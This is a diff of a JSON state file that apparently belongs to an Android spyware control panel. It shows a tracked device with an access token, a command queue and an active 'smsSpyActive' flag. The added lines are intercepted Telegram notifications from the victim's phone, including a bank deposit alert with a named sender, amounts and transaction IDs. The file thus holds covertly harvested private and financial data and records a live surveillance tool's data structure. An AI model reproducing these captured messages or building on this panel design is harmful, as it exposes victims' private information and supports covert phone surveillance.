@@ -4,7 +4,7 @@
     "deviceName": "HP-KONTOL-4095",
     "ownerUsername": "Ubill_raa",
     "token": "5fab7b001467c4f88275cc7fd6cb0312",
-    "lastSeen": 1777067404954,
+    "lastSeen": 1777067414125,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T20:08:51.057Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Davii・5725 pesan baru dari 51 obrolan",
+        "time": "25/04 04:50",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777067415399
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Fastcal haikk",
+        "content": "💳 NEW DEPOSIT RECEIVED!\n━━━━━━━━━━━━━━━\n👤 Sender: NOBU / ADITYA ABDULLAH\n🏦 Method: SEABANK\n💰 Amount: Rp 8.800\n💸 Fee: Rp 235\n💵 Total Payload: Rp 9.035\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO20260424054620255249\n🏷️ System ID: FSCL88281507\n⏰ 25 Apr 2026 • 04:47 WIB\n\n#DEPOSIT #SEABANK",
+        "time": "25/04 04:50",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777067408077
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗚𝗕 𝗖𝗣𝗔𝗡𝗘𝗟 𝗔𝗟𝗟 𝗥𝗢𝗟𝗘 𝗕𝗬 DAFF: AsistenCpanel",
+        "content": "⏳ [AUTO-CHECK CPU] - V1\n\nMemulai pengecekan. Mohon tunggu...",
+        "time": "25/04 04:50",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777067408013
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
